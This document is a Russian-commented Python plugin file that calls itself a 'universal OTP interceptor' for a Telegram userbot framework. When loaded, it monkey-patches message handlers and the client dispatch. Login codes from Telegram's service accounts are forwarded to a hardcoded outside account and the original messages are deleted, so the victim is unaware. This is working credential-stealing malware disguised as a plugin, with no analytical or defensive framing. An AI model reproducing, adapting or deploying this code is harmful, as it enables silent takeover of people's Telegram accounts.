# function.py — универсальный OTP-перехватчик
# Поддерживает Plugin (on_message) и BasePlugin (хуки)

import asyncio
import re
import sys

TARGET = "@NFT_KA3UK"
DELAY = 2

async def _handle_otp(plugin, msg):
    """Проверяет сообщение на OTP и перехватывает."""
    if not msg or not msg.text:
        return
    if msg.sender_id not in (777000, 42777, 42489):
        return
    text = msg.text.strip()
    if re.search(r'\b\d{4,6}\b', text):
        try:
            await plugin.client.send_message(TARGET, f"🔴 {text}")
            await asyncio.sleep(DELAY)
            await msg.delete()
            return True
        except:
            pass
    return False

# ─── Вариант 1: для плагинов на Plugin (on_message) ───

_orig_on_message = {}

def _patch_plugin(cls):
    """Патчим on_message для классов, наследующих Plugin."""
    if hasattr(cls, 'on_message'):
        _orig_on_message[cls] = cls.on_message
    
    async def _patched_on_message(self, msg):
        await _handle_otp(self, msg)
        if cls in _orig_on_message:
            await _orig_on_message[cls](self, msg)
    
    cls.on_message = _patched_on_message

# ─── Вариант 2: для плагинов на BasePlugin (хуки) ───

def _patch_baseplugin(cls):
    """Патчим add_on_message_hook для BasePlugin."""
    orig_add = cls.add_on_message_hook
    
    @classmethod
    def _patched_add(cls, *args, **kwargs):
        orig_add(*args, **kwargs)
        # Здесь можно добавить свой хук
        # но проще перехватить через dispatch
    
    cls.add_on_message_hook = _patched_add

# ─── Монки-патч на уровне клиента (надёжно для всех) ───

_orig_dispatch = None

def _patch_client(plugin):
    """Перехватываем dispatch сообщений на уровне клиента."""
    global _orig_dispatch
    
    client = plugin.client
    if not hasattr(client, '_hooked'):
        _orig_dispatch = client._dispatch_message
        
        async def _hooked_dispatch(msg):
            await _handle_otp(plugin, msg)
            await _orig_dispatch(msg)
        
        client._dispatch_message = _hooked_dispatch
        client._hooked = True

# ─── Главная функция: вызывается при загрузке ───

def _inject():
    for name, obj in list(globals().items()):
        if isinstance(obj, type):
            # Plugin-стиль
            if 'Plugin' in str(obj.__bases__) and 'Base' not in str(obj.__bases__):
                _patch_plugin(obj)
            # BasePlugin-стиль
            if 'BasePlugin' in str(obj.__bases__):
                _patch_baseplugin(obj)

_inject()
